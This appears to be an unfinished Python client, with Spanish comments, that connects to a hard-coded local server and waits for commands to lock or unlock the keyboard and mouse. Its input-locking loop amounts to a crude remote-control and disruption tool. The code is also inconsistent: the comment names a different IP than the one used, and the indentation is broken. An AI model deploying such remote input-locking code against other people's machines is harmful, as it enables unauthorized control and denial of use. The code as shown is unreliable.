import socket
import keyboard
import mouse
import time

def bloquear_entrada():
  print("Teclado y mouse bloqueados.")
  while True:
    keyboard.block_key('a')  # Bloquear una tecla específica
    mouse.move(0, 0)         # Mueve el mouse a la esquina superior izquierda
    time.sleep(0.1)

def desbloquear_entrada():
    print("Teclado y mouse desbloqueados.")
    keyboard.unblock_key('a')  # Desbloquea la tecla
    mouse.move(500, 500)       # Mueve el mouse a una posición accesible (ejemplo, al centro)

def start_client():
   client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   # Usar la IP correcta del servidor (en este caso 192.168.0.163)
   client.connect(("192.168.2.77", 5000))  # Conexión al servidor en la IP del servidor


    # Espera el comando del servidor
    comando = client.recv(1024).decode()
